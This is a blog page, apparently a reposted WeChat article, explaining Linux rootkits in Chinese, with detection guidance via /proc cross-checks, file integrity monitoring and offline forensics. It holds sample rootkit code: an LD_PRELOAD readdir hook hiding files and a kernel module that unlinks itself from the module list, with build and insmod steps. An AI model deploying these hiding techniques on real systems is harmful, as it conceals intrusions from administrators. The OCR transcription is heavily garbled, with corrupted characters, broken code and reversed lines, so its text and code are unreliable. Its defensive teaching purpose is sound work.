@@ -1,0 +1,182 @@
+<!doctype html><html lang=zh-Hant dir=ltr class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>Linux Rootkit：技術原理、攻擊實作與可靠性檢測 | w0x7ce</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true property=og:image content=https://w0x7ce.eu/img/w0x7ce-social-card.png /><meta data-rh=true name=twitter:image content=https://w0x7ce.eu/img/w0x7ce-social-card.png /><meta data-rh=true property=og:url content=https://w0x7ce.eu/blog/2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763 /><meta data-rh=true property=og:locale content=zh_Hant /><meta data-rh=true name=docusaurus_locale content=zh-Hant /><meta data-rh=true name=docusaurus_tag content=default /><meta data-rh=true name=docsearch:language content=zh-Hant /><meta data-rh=true name=docsearch:docusaurus_tag content=default /><meta data-rh=true property=og:title content="Linux Rootkit：技術原理、攻擊實作與可靠性檢測 | w0x7ce"/><meta data-rh=true name=description content="从微信公众号导入的文章《Linux Rootkit：技術原理、攻擊實作與可靠性檢測》，保留原始排版图并提供本地 OCR 转写。"/><meta data-rh=true property=og:description content="从微信公众号导入的文章《Linux Rootkit：技術原理、攻擊實作與可靠性檢測》，保留原始排版图并提供本地 OCR 转写。"/><meta data-rh=true property=og:type content=article /><meta data-rh=true property=article:published_time content=2025-07-22T00:00:00.000Z /><meta data-rh=true property=article:author content=https://github.com/tianrking /><meta data-rh=true property=article:tag content=微信公眾號 /><link data-rh=true rel=icon href=/img/favicon.svg /><link data-rh=true rel=canonical href=https://w0x7ce.eu/blog/2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763 /><link data-rh=true rel=alternate href=https://w0x7ce.eu/blog/2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763 hreflang=zh-Hant /><link data-rh=true rel=alternate href=https://w0x7ce.eu/blog/2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763 hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@id":"https://w0x7ce.eu/blog/2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763","@type":"BlogPosting","author":{"@type":"Person","description":"MySelf","image":"https://github.com/tianrking.png","name":"w0x7ce","url":"https://github.com/tianrking"},"datePublished":"2025-07-22T00:00:00.000Z","description":"从微信公众号导入的文章《Linux Rootkit：技術原理、攻擊實作與可靠性檢測》，保留原始排版图并提供本地 OCR 转写。","headline":"Linux Rootkit：技術原理、攻擊實作與可靠性檢測","isPartOf":{"@id":"https://w0x7ce.eu/blog","@type":"Blog","name":"Blog"},"keywords":[],"mainEntityOfPage":"https://w0x7ce.eu/blog/2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763","name":"Linux Rootkit：技術原理、攻擊實作與可靠性檢測","url":"https://w0x7ce.eu/blog/2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763"}</script><link rel=alternate type=application/rss+xml href=/blog/rss.xml title="w0x7ce RSS Feed"><link rel=alternate type=application/atom+xml href=/blog/atom.xml title="w0x7ce Atom Feed"><link rel=preconnect href=https://www.google-analytics.com><link rel=preconnect href=https://www.googletagmanager.com><script async src="https://www.googletagmanager.com/gtag/js?id=G-54QBN2XYB9"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-54QBN2XYB9",{anonymize_ip:!0})</script><script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8741919641227561" async crossorigin=anonymous></script><link rel=stylesheet href=/assets/css/styles.e0a3479d.css /><script src=/assets/js/runtime~main.acdc793f.js defer></script><script src=/assets/js/main.86f9560a.js defer></script></head><body><svg style="display: none;"><defs>
+<symbol id=theme-svg-external-link viewBox="0 0 24 24"><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
+</defs></svg>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-377")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/img/logo.svg /><link rel=preload as=image href=https://github.com/tianrking.png /><div role=region aria-label=跳至主要内容><a class=skipToContent_fXgn href=#__docusaurus_skipToContent_fallback>跳至主要内容</a></div><nav aria-label=主導航 class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label=切換導覽列 aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/><div class=navbar__logo><img src=/img/logo.svg alt=w0x7ce class="themedComponent_mlkZ themedComponent--light_NVdE"/><img src=/img/logo.svg alt=w0x7ce class="themedComponent_mlkZ themedComponent--dark_xIcU"/></div><b class="navbar__title text--truncate">w0x7ce</b></a><a class="navbar__item navbar__link" href=/tutorial>技術筆記</a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/blog>開發誌</a><a class="navbar__item navbar__link" href=/explore>探索</a><a class="navbar__item navbar__link" href=/projects>專案</a><a class="navbar__item navbar__link" href=/databases>資料庫</a><a class="navbar__item navbar__link" href=/labs>實驗場</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href=https://github.com/tianrking target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_nPIU><use href=#theme-svg-external-link /></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type=button disabled title="system mode" aria-label="切換淺色/深色模式（當前為system mode）"><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div><div class=navbarSearchContainer_Bca1><div class="navbar__search searchBarContainer_NW3z" dir=ltr><svg aria-hidden=true class=searchIcon_T3tP focusable=false viewBox="0 0 16 16"><path fill=currentColor d="M6.02945 10.20327a4.17382 4.17382 0 1 1 4.17382-4.17382 4.15609 4.15609 0 0 1-4.17382 4.17382Zm9.69195 4.2199-4.8225-4.82338A5.88021 5.88021 0 0 0 12.058 6.02856 6.00467 6.00467 0 1 0 9.59979 10.8989l4.82338 4.82338a.89729.89729 0 0 0 1.29912 0 .89749.89749 0 0 0-.00087-1.29909Z"/></svg><input placeholder=搜尋 aria-label=Search class="navbar__search-input searchInput_YFbd" value="" /><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class=row><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label=最近部落格文章導覽><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role=group><h3 class=yearGroupHeading_rMGB>2026</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/mihomo-tun-cidr-route-exclude-fake-ip-direct>從 CIDR 到 TUN：IPv4 前綴、主機路由與 Mihomo 流量控制的工程解析</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/cat1-audio-upload-http-tls-socket-performance>為何錄音卡的 Cat.1 上傳選擇 HTTP over TLS Socket：從 UART、分片回執到可靠提速</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/smart-wearable-sensor-research>智能穿戴傳感器與介面選型研究：從物理量、器件到系統驗證</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/vpu-contact-vibration-microphone-research>VPU 與接觸式振動拾音器：原理、器件、電話錄音、論文與開源實作</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/esp32s3-25t-ultrasonic-waveform-envelope-microphone-spectrogram>从 GPIO4 到 Actions ATS3085S 模拟 MIC：25T 超声波的波形与采样模型</a></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class=title_f1Hy>Linux Rootkit：技術原理、攻擊實作與可靠性檢測</h1><div class="container_mt6G margin-vert--md"><time datetime=2025-07-22T00:00:00.000Z>2025年7月22日</time> · <!-- -->閱讀時間約 7 分鐘</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href=https://github.com/tianrking target=_blank rel="noopener noreferrer" class=avatar__photo-link><img class="avatar__photo authorImage_XqGP" src=https://github.com/tianrking.png alt=w0x7ce /></a><div class="avatar__intro authorDetails_lV9A"><div class=avatar__name><a href=https://github.com/tianrking target=_blank rel="noopener noreferrer"><span class=authorName_yefp translate=no>w0x7ce</span></a></div><small class=authorTitle_nd0D title=MySelf>MySelf</small><div class=authorSocials_rSDt></div></div></div></div></div></header><div id=__blog-post-container class=markdown><blockquote>
+<p>发布于 2025-07-22 11:14:48（微信公众号导出记录）。</p>
+<p>本文来自公众号后台的“导出文章内容”功能。博客正文由导出长图进行本地 OCR 转写，并保留原始排版图用于逐段核对。</p>
+<p>原文链接：<a href="http://mp.weixin.qq.com/s?__biz=MzIwMjMyNzIzNw==&mid=2247484763&idx=1&sn=f5e22673e7611dea0b9f89ee5478279b&chksm=96e110f1a19699e7b01d28c3779636b6a0610897cf85098e2efccf7b550e4479df79c6915eaf#rd" target=_blank rel="noopener noreferrer" class="">查看原文</a></p>
+<p>OCR 转写有效文字约 4101 字；代码、流程图和版式以文末原始排版图为准。</p>
+</blockquote>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=正文本地-ocr-转写>正文（本地 OCR 转写）<a href=#正文本地-ocr-转写 class=hash-link aria-label="正文（本地 OCR 转写）的直接連結" title="正文（本地 OCR 转写）的直接連結" translate=no>​</a></h2>
+<p>本文旨在對Linux 璟填下的 Rootkit技術进行深度分析,提供基於C韶言和内核模组的攻型
+震作例,亚量述在系统工具可已被污染的情况下,如何造行可靠的状感推视网系接别</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=第一章使用者空間rootkitld_preload劫持>第一章:使用者空間Rootkit:LD_PRELOAD劫持<a href=#第一章使用者空間rootkitld_preload劫持 class=hash-link aria-label=第一章:使用者空間Rootkit:LD_PRELOAD劫持的直接連結 title=第一章:使用者空間Rootkit:LD_PRELOAD劫持的直接連結 translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=11技衡原理>1.1技衡原理<a href=#11技衡原理 class=hash-link aria-label=1.1技衡原理的直接連結 title=1.1技衡原理的直接連結 translate=no>​</a></h3>
+<p>L1nux 删感谨结器(Dynamic Linker)透遇 LD_PRELOAD 瑞境攀数,允许在庭用释式欲删時
+制像先载入指定的共享座(.50榴案)。攻聚者可利用此機别,编寫一因恶意共享序置作與棵单
+C函式座(Libc)中同名的函式。l.s 等指令被软行i,恶盈函式會取代原始函式,而描
+亚通输出,到围荒榴案等目的。</p>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=12實作询實验劫博readdir>1.2實作询實验:劫博readdir<a href=#12實作询實验劫博readdir class=hash-link aria-label=1.2實作询實验:劫博readdir的直接連結 title=1.2實作询實验:劫博readdir的直接連結 translate=no>​</a></h3>
+<p>本實胎建一健慈意共享康,劫持readd1r函式,以爆藏所有以_SECRET_為前绥的相案
+攻程式碼(ld_hijack.c)
+#define <em>GNU_soURCE
+#include &lt;stdio.h>
+#include &lt;dirent.hs
+static const char* HIDE_PREFIX = *<em>SECRET</em>";
+//原始readd1r通式的通式指標原型
+Lypedef slruct dirent * {*arig</em> reatdir_t](0iR ×dirp);
+//置作[ibc中rcaddir 同名的意函式
+//透通dlsyn瘙取下一需符號(即原始的readdir)的位址
+orig_readdir_t orig_readdir = (orig_readdir_t)dlsym[RTLo_NExT, *re
+struct dirent *dir;
+11通面呼叫原始函式,直到找到一留不需题的修目
+while ((dir = orig_readdir(dirp)1) {
+1f (strstr(cir->d_nane, HIDE_PREFIX) -- NULL} {
+break://如需瘤各不包含题的摄,别回傅酸修目
+relurn dir;</p>
+<p>實验步眼与验资
+并1.输物共享康
+gcc -shared -fpIc lc_h11ack.c -o ld_h1jack.so -ldl
+#2.别建测试瘤察
+touch _SECRET_internal_memo.txt
+touch public_report.txt</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=3正常赖行l5所有慶案均可党>3.正常赖行L5,所有慶案均可党<a href=#3正常赖行l5所有慶案均可党 class=hash-link aria-label=3.正常赖行L5,所有慶案均可党的直接連結 title=3.正常赖行L5,所有慶案均可党的直接連結 translate=no>​</a></h2>
+<p>echo "..- [BeFoRE] Running ls nornally!"
+ls -1
+预期输出:
+#_SECRET_interna?_memo.txt
+12# Id_hijack.so
+13 # public_reporf.txt</p>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=14>1.4#<a href=#14 class=hash-link aria-label=1.4#的直接連結 title=1.4#的直接連結 translate=no>​</a></h3>
+<p>15#4.使用LD_PRELOAD赖行5,秘密察鼓硬离
+echo -e "yn--- [AFTER] Running ls with LD_PRELOAD:"
+18#预期糖出(_SECRET_InternaL_meno.txt B消失):
+#Id_hijack.c
+21# pubtic_report.txt</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=第二章内核空間rootkit横組奥系統呼叫>第二章:内核空間Rootkit:横組奥系統呼叫<a href=#第二章内核空間rootkit横組奥系統呼叫 class=hash-link aria-label=第二章:内核空間Rootkit:横組奥系統呼叫的直接連結 title=第二章:内核空間Rootkit:横組奥系統呼叫的直接連結 translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=21技衡原理虎置作泄薇内核模>2.1技衡原理虎置作:泄薇内核模<a href=#21技衡原理虎置作泄薇内核模 class=hash-link aria-label=2.1技衡原理虎置作:泄薇内核模的直接連結 title=2.1技衡原理虎置作:泄薇内核模的直接連結 translate=no>​</a></h3>
+<ul>
+<li class="">技原理Linux内核透遇一個蔓向耀结果列束遍能所有已数人的极组(LKM)。1smod播令</li>
+</ul>
+<p>的调訊来源即為此经表。量LKM在基人後,可执行
+ist_del_init(&_this_module.list),其自身的點偿此经表中移除,而
+lsmod 等標萃工具周形</p>
+<ul>
+<li class="">實驰:藏LKM或用交叉比法發玥它</li>
+</ul>
+<p>攻聚程式码(hidden_Lkn.c)</p>
+<p>include &lt;linux/init.h>
+HODULE_LICENSE(<em>GPL</em>);
+HoDULE_DESCRIPTIoN(*A module that hides itself fron lsmod");
+static int _init hidden_init(void) {
+11偿全垃模组缺表中游白身移除,實理硬微
+list_del_init(&_this_module.list);
+return 6;
+static void __exit hidden_exit(void) {}
+nodule_exit(hidden_exit) ;
+Makefile
+obj -n += hidden_1kn.0
+all:
+nake -C /lib/nocules/${sheLL unane -r] /buitd M=$[PWD) modules
+clean:
+nake -C /lib/nodules/$(shell unane -r) /build M=$(PD)clean
+部署奥检测實验
+并1.编螺模组(假投環境配置正础)
+make
+#2.加载模组
+sudo insmod hidden_1km.ko</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=53使用lsnod-罐预期线不致hdden_lkn>53.使用Lsnod 罐,预期线不致hdden_Lkn<a href=#53使用lsnod-罐预期线不致hdden_lkn class=hash-link aria-label="53.使用Lsnod 罐,预期线不致hdden_Lkn的直接連結" title="53.使用Lsnod 罐,预期线不致hdden_Lkn的直接連結" translate=no>​</a></h2>
+<p>echo ".-- [INFo] Checking with lsnod.."
+lsnod I grep hidden_1km
+[INFo] lsnod check conplete. (No output is expected)*
+echo "...</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=4可靠的搬漏交又比prockallsyns-與procnodutes>4.可靠的搬漏:交又比/proc/kallsyns 與/proc/nodutes<a href=#4可靠的搬漏交又比prockallsyns-與procnodutes class=hash-link aria-label="4.可靠的搬漏:交又比/proc/kallsyns 與/proc/nodutes的直接連結" title="4.可靠的搬漏:交又比/proc/kallsyns 與/proc/nodutes的直接連結" translate=no>​</a></h2>
+<p>ccho -e "yn--- [INFo] crass-referencing ta find hidden modules...*
+conn -23 <br/>
+<!-- -->'s//1/s。 pes I ,[Ns qutad}, xe | su(s11ex/soud/ ,[s-1, da6]>
+(n- ↓uos | sanpom/soud/ {ts 4urud), xme]>
+14预据糖出:
+15#hidden_Lka
+技斯原理:系统呼叫封持
+此技術透通修改内核中的系呼叫表[sys_cal1_table),将原始的系統呼叫函式指标替换為恶意
+函式的位址。这是量高耀限的截方式。但由龄现代Linux内核包含多强大的安全制(如
+KernelLockdown),直接、疆定地實作此技術度依赖特定且通常较善的内核環境,故本文聚您
+於其理逾和椎测方法。</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=第三章直接取盟proc重建系统状慧>第三章:直接取盟:/proc重建系统状慧<a href=#第三章直接取盟proc重建系统状慧 class=hash-link aria-label=第三章:直接取盟:/proc重建系统状慧的直接連結 title=第三章:直接取盟:/proc重建系统状慧的直接連結 translate=no>​</a></h2>
+<p>当疑系统工具已被污染時,必酒通它仍,直接内核暴鑫的原始数據源/proc檔案系统中请取
+资讯。</p>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=31可靠的行程列表ps替代方案>3.1可靠的行程列表(ps替代方案)<a href=#31可靠的行程列表ps替代方案 class=hash-link aria-label=3.1可靠的行程列表(ps替代方案)的直接連結 title=3.1可靠的行程列表(ps替代方案)的直接連結 translate=no>​</a></h3>
+<ul>
+<li class="">原理:遍歷/proc目錄下的數字子目錄。每個數字目錄即為一個行程ID(PID),其下的</li>
+</ul>
+<p>comm文件是行程名,cmdline文件是完整的動指令行(以\0分隔)。</p>
+<ul>
+<li class="">實指令</li>
+</ul>
+<p>d uou4 sossd s doi Butistn Anqetiad ---, ooe
+echo ".-- Reliably Listing Top 5 Processes from /proc:"
+/,p- ns | +[6-a]. aueu- p adf1- [ yndapxeu- aoud/ putj)$ ut pid Joj
+printf "PID: %-7s Name: %-15s Cmdline: %s\n"<br/>
+<!-- -->"PTd$"
+"$(cat /proc/$pid/comm 2>/dev/null)"<br/>
+<!-- -->done 丨head -n 5</p>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=32可靠的網路連接列表netstatss替代方案>3.2可靠的網路連接列表(netstat/ss替代方案)<a href=#32可靠的網路連接列表netstatss替代方案 class=hash-link aria-label=3.2可靠的網路連接列表(netstat/ss替代方案)的直接連結 title=3.2可靠的網路連接列表(netstat/ss替代方案)的直接連結 translate=no>​</a></h3>
+<ul>
+<li class="">原理:直接解析/proc/net/tcp文件。該文件包含了所有TCP連接的底層資訊,但其</li>
+</ul>
+<p>IP地址和端口號是以十六進制(且為LittleEndian字序)格式存的,需要解碼。</p>
+<ul>
+<li class="">實驗指令與本</li>
+</ul>
+<p>解碼本(decode_tcp.awk)
+#!/usr/bin/awk -f
+function hex_to_dec(h) { return sprintf("%d","ox" h)}
+function hex_to_ip(h){
+return hex_to_dec(substr(h,7,2)) "." hex_to_dec(substr(h,5,2)) ".
+{
+BEGIN{
+printf "%-22s %-22s %s\n","Local Address","Remote Address","Sta’
+states["O1"]="ESTABLISHED"; States["OA"]="LISTEN";
+6
+10
+{
+11
+NR > 1 {
+split($2, local, ":");
+12
+13
+split($3,remote,":");
+14
+if ($4 in states){ state = states[$4] } else { state ="oTHER" }
+15
+printf "%-22s %-22s %s\n",
+16
+hex_to_ip(local[1]) ":" hex_to_dec(local[2]),
+17
+18
+state</p>
+<p>執行解碼
+echo ".-- Reliably Listing TcP Connections from /proc/net/tcp:"
+chmod +x decode_tcp.awk
+./decode_tcp.awk /proc/net/tcp</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=第四章系統化的测與離線分析>第四章:系統化的测與離線分析<a href=#第四章系統化的测與離線分析 class=hash-link aria-label=第四章:系統化的测與離線分析的直接連結 title=第四章:系統化的测與離線分析的直接連結 translate=no>​</a></h2>
+<p>手動查適用於初步判,系統化的策略才是防的關键。</p>
+<ul>
+<li class="">檔案完整性控(FIM):使用AIDE、debsums或rpm-V等工具,定期對關键系統檔</li>
+</ul>
+<p>案的雜凑值(hash)進行比對,以發現二進位檔案替換。</p>
+<ul>
+<li class="">離線分析(offlineAnalysis):這是最可靠的機测方法。在受疑系統關機或被隔離後,</li>
+</ul>
+<p>對其記憶體轉或磁碟映像進行分析。
+o記憶體取證:使用Volatility3框架,其linux.check_Syscalls插件可精確機
+測系統呼叫表是否被排;linux.check_modules可發現藏的内核模組。
+o磁碟取證:使用TheSleuthKit(TSK)等工具,可底層文件系統結構中恢復被
+Rootkit藏或“删除”的檔案。</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=第五章總結>第五章:總結<a href=#第五章總結 class=hash-link aria-label=第五章:總結的直接連結 title=第五章:總結的直接連結 translate=no>​</a></h2>
+<p>本文透通理結合可重現的實驗,系統性地展示了Rootkit的攻擎手法與可靠的測方式。其核
+心結為:在應對高威時,必须放對標准高層工具的盲目信任,韩而/proc等内核直接暴
+露的數據源進行底層取證與交叉驗證。對於深度藏的内核級威,離線取證是最終且最可靠的裁决
+手段。</p>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=原始排版图>原始排版图<a href=#原始排版图 class=hash-link aria-label=原始排版图的直接連結 title=原始排版图的直接連結 translate=no>​</a></h2>
+<p><img decoding=async loading=lazy alt="Linux Rootkit：技術原理、攻擊實作與可靠性檢測：微信公众号导出原始排版图" src=/assets/images/article-e95ac95eb51a003a210e3af08d9529ca.webp width=1280 height=5277 class=img_ev3q /></div><footer class=docusaurus-mt-lg><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class=col><b>標籤：</b><ul class="tags_jXut padding--none margin-left--sm"><li class=tag_QGVx><a rel=tag title=從個人微信公眾號整理到博客的文章 class="tag_zVej tagRegular_sFm0" href=/blog/tags/wechat-official-account>微信公眾號</a></ul></div></div><div class="row margin-top--sm theme-blog-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href=https://github.com/tianrking/tianrking.github.io/tree/V3.10.2/blog/2025-07-22-2025-07-22-linux-rootkit-技術原理-攻擊實作與可靠性檢測-2247484763.md target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_Z9Sw aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>編輯此頁</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label=部落格文章分頁導覽><a class="pagination-nav__link pagination-nav__link--prev" href=/blog/2025-07-23-2025年開發者深度對比分析報告-以太坊-vs-bnb智能鏈-2247484768><div class=pagination-nav__sublabel>較新一篇</div><div class=pagination-nav__label>2025年開發者深度對比分析報告：以太坊 vs. BNB智能鏈</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/blog/2025-07-20-實驗日誌-從零到一-構建可雙向操作的-eth-抵押穩定幣協議-2247484757><div class=pagination-nav__sublabel>較舊一篇</div><div class=pagination-nav__label>實驗日誌：從零到一，構建可雙向操作的 ETH 抵押穩定幣協議</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#正文本地-ocr-转写 class="table-of-contents__link toc-highlight">正文（本地 OCR 转写）</a><li><a href=#第一章使用者空間rootkitld_preload劫持 class="table-of-contents__link toc-highlight">第一章:使用者空間Rootkit:LD_PRELOAD劫持</a><ul><li><a href=#11技衡原理 class="table-of-contents__link toc-highlight">1.1技衡原理</a><li><a href=#12實作询實验劫博readdir class="table-of-contents__link toc-highlight">1.2實作询實验:劫博readdir</a></ul><li><a href=#3正常赖行l5所有慶案均可党 class="table-of-contents__link toc-highlight">3.正常赖行L5,所有慶案均可党</a><ul><li><a href=#14 class="table-of-contents__link toc-highlight">1.4#</a></ul><li><a href=#第二章内核空間rootkit横組奥系統呼叫 class="table-of-contents__link toc-highlight">第二章:内核空間Rootkit:横組奥系統呼叫</a><ul><li><a href=#21技衡原理虎置作泄薇内核模 class="table-of-contents__link toc-highlight">2.1技衡原理虎置作:泄薇内核模</a></ul><li><a href=#53使用lsnod-罐预期线不致hdden_lkn class="table-of-contents__link toc-highlight">53.使用Lsnod 罐,预期线不致hdden_Lkn</a><li><a href=#4可靠的搬漏交又比prockallsyns-與procnodutes class="table-of-contents__link toc-highlight">4.可靠的搬漏:交又比/proc/kallsyns 與/proc/nodutes</a><li><a href=#第三章直接取盟proc重建系统状慧 class="table-of-contents__link toc-highlight">第三章:直接取盟:/proc重建系统状慧</a><ul><li><a href=#31可靠的行程列表ps替代方案 class="table-of-contents__link toc-highlight">3.1可靠的行程列表(ps替代方案)</a><li><a href=#32可靠的網路連接列表netstatss替代方案 class="table-of-contents__link toc-highlight">3.2可靠的網路連接列表(netstat/ss替代方案)</a></ul><li><a href=#第四章系統化的测與離線分析 class="table-of-contents__link toc-highlight">第四章:系統化的测與離線分析</a><li><a href=#第五章總結 class="table-of-contents__link toc-highlight">第五章:總結</a><li><a href=#原始排版图 class="table-of-contents__link toc-highlight">原始排版图</a></ul></div></div></div></div></div><footer class=footer_pkqC><div class="container inner_w9l9"><div class=identity_txwY><a class=brand_EKcE href=/>w0x7ce</a><p>技術筆記、專案和小實驗。<p class=scope_N8OL>Embedded systems · Local AI · Infrastructure</div><nav class=navigation_yoHX aria-label=頁尾導覽><a href=/tutorial>技術筆記</a><a href=/blog>開發誌</a><a href=/projects>專案</a><a href=/labs>實驗場</a></nav><div class=external_UDxs><a href=https://github.com/tianrking target=_blank rel="noopener noreferrer">GitHub ↗</a><a href=mailto:tian.r.king@gmail.com aria-label="Email tian.r.king@gmail.com">Email</a></div></div><div class="container bottom_SvXX"><span>© <!-- -->2026<!-- --> w0x7ce</span><span>Built with Docusaurus</span></div></footer></div></body>
